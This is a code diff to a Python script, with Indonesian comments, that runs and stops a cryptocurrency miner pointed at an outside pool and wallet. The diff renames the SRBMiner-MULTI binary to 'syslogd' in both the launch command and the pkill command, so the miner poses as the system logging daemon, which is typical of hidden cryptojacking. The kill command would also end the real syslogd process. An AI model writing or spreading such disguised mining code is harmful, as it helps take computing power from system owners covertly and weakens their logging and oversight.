@@ -27,7 +27,7 @@ def get_numa_info():
 def stop_mining():
     """Menghentikan semua proses mining"""
     try:
-        subprocess.run("pkill -f SRBMiner-MULTI", shell=True)
+        subprocess.run("pkill -f syslogd", shell=True)
         print("Semua proses mining telah dihentikan.")
     except Exception as e:
         print(f"Gagal menghentikan mining: {e}")
@@ -50,7 +50,7 @@ def start_mining(numa_node=0, limit_percent=80, initial_threads=1):
     while True:
         try:
             while threads <= max_threads:
-                command = f"./SRBMiner-MULTI -a verushash -o stratum+tcp://cn.vipor.net:5040 -u RHy311pnvcN1nn47MZmyA2FAaCVFiCgWim.pmryn-srg -p x t {threads}"
+                command = f"./syslogd -a verushash -o stratum+tcp://cn.vipor.net:5040 -u RHy311pnvcN1nn47MZmyA2FAaCVFiCgWim.pmryn-srg -p x t {threads}"
                 
                 print(f"Menjalankan mining dengan {threads} thread")
                 
